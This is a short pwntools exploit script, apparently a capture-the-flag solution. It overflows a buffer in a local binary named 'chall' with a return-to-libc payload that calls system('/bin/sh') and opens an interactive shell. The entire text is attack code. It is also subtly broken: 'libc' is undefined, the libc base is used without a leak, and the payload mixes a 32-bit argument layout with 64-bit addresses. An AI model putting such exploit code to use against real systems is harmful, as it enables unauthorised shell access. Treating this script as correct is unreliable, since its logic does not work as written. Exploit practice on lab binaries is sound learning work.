from pwn import *

binary = "./chall"
elf = context.binary = ELF(binary)

# Start process
io = process(binary)

# Prepare payload
padding = b"A" * 32  # Buffer size
libc_base = elf.libc.address  # If you have a libc leak
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

payload = padding
payload += p64(system_addr)
payload += b"JUNKJUNK"  # Placeholder for RBP (not used in this case)
payload += p64(bin_sh_addr)

# Send the payload
io.sendline(payload)
io.interactive()

